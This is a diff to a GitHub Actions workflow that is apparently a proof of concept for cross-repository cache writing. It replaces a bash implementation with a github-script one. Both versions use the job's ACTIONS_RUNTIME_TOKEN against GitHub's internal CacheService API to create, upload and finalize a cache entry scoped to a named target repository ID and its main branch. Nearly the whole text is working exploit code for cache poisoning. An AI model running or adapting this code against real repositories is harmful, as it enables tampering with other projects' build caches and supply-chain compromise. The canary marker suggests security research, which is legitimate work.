@@ -7,37 +7,44 @@ jobs:
   crosswrite:
     runs-on: ubuntu-latest
     steps:
-      - name: Bootstrap Actions cache plumbing
-        uses: actions/cache@v4
-        with:
-          path: seed_cache
-          key: g06-crosswrite-seed-${{ github.run_id }}
       - name: Write A namespace cache canary
-        shell: bash
-        run: |
-          set -euo pipefail
-          mkdir -p ab_cache out seed_cache
-          printf "B_CACHE_CROSSWRITE_CANARY_20260804\n" > ab_cache/cache.txt
-          printf "seed\n" > seed_cache/seed.txt
-          tar -czf out/cache.tgz ab_cache
-          base="${ACTIONS_RESULTS_URL%/}"
-          tok="${ACTIONS_RUNTIME_TOKEN}"
-          key="ab-crosswrite-poc-28846338784"
-          version="3d21fd69cb5beab0e9a17bac72ea45f1318ffaa15426a0f433482e5944100f0b"
-          body=$(jq -n --arg key "$key" --arg version "$version" --arg rid "1322235892" "{key:\$key,version:\$version,metadata:{repository_id:(\$rid|tonumber),scope:[{scope:\"refs/heads/main\",permission:3}]}}")
-          printf "%s\n" "$body" > out/create-request.json
-          base_url="$base/twirp/github.actions.results.api.v1.CacheService"
-          status=$(curl -sS -o out/create-response.json -w "%{http_code}" -H "Authorization: Bearer $tok" -H "Content-Type: application/json" --data "$body" "$base_url/CreateCacheEntry")
-          echo "CREATE_HTTP=$status" | tee out/summary.txt
-          cat out/create-response.json >> out/summary.txt
-          upload_url=$(jq -r ".signed_upload_url // empty" out/create-response.json)
-          test -n "$upload_url"
-          curl -sS -X PUT "$upload_url" --data-binary @out/cache.tgz -o out/upload-response.txt -w "UPLOAD_HTTP=%{http_code}\n" | tee -a out/summary.txt
-          size=$(stat -c%s out/cache.tgz)
-          finalize_body=$(jq -n --arg key "$key" --arg version "$version" --arg size "$size" "{key:\$key,version:\$version,size_bytes:(\$size|tonumber)}")
-          final_status=$(curl -sS -o out/finalize-response.json -w "%{http_code}" -H "Authorization: Bearer $tok" -H "Content-Type: application/json" --data "$finalize_body" "$base_url/FinalizeCacheEntryUpload")
-          echo "FINALIZE_HTTP=$final_status" | tee -a out/summary.txt
-          cat out/finalize-response.json >> out/summary.txt
+        uses: actions/github-script@v7
+        env:
+          TARGET_REPOSITORY_ID: "1322235892"
+          CACHE_KEY: "ab-crosswrite-poc-28846338784"
+          CACHE_VERSION: "3d21fd69cb5beab0e9a17bac72ea45f1318ffaa15426a0f433482e5944100f0b"
+        with:
+          script: |
+            const fs = require("fs");
+            const { execFileSync } = require("child_process");
+            fs.mkdirSync("ab_cache", { recursive: true });
+            fs.mkdirSync("out", { recursive: true });
+            fs.writeFileSync("ab_cache/cache.txt", "B_CACHE_CROSSWRITE_CANARY_20260804\n");
+            execFileSync("tar", ["-czf", "out/cache.tgz", "ab_cache"]);
+            const base = (process.env.ACTIONS_RESULTS_URL || "").replace(/\/$/, "");
+            const token = process.env.ACTIONS_RUNTIME_TOKEN || "";
+            const key = process.env.CACHE_KEY;
+            const version = process.env.CACHE_VERSION;
+            const metadata = { repository_id: Number(process.env.TARGET_REPOSITORY_ID), scope: [{ scope: "refs/heads/main", permission: 3 }] };
+            const body = { key, version, metadata };
+            fs.writeFileSync("out/create-request.json", JSON.stringify(body));
+            const headers = { Authorization: "Bearer " + token, "Content-Type": "application/json", Accept: "application/json" };
+            const create = await fetch(base + "/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry", { method: "POST", headers, body: JSON.stringify(body) });
+            const createText = await create.text();
+            fs.writeFileSync("out/create-response.json", createText);
+            fs.writeFileSync("out/env-summary.txt", JSON.stringify({ base, tokenLength: token.length, repository: process.env.GITHUB_REPOSITORY, repositoryId: process.env.GITHUB_REPOSITORY_ID }));
+            if (!create.ok) throw new Error("CREATE_HTTP=" + create.status + " " + createText);
+            const signed = JSON.parse(createText).signed_upload_url;
+            const archive = fs.readFileSync("out/cache.tgz");
+            const upload = await fetch(signed, { method: "PUT", body: archive });
+            fs.writeFileSync("out/upload-response.txt", "UPLOAD_HTTP=" + upload.status + "\n" + await upload.text());
+            if (!upload.ok) throw new Error("UPLOAD_HTTP=" + upload.status);
+            const finalizeBody = { key, version, size_bytes: archive.length };
+            const finalize = await fetch(base + "/twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload", { method: "POST", headers, body: JSON.stringify(finalizeBody) });
+            const finalizeText = await finalize.text();
+            fs.writeFileSync("out/finalize-response.json", finalizeText);
+            fs.writeFileSync("out/summary.txt", "CREATE_HTTP=" + create.status + "\nUPLOAD_HTTP=" + upload.status + "\nFINALIZE_HTTP=" + finalize.status + "\n" + finalizeText);
+            if (!finalize.ok) throw new Error("FINALIZE_HTTP=" + finalize.status + " " + finalizeText);
       - name: Upload crosswrite evidence
         if: always()
         uses: actions/upload-artifact@v4
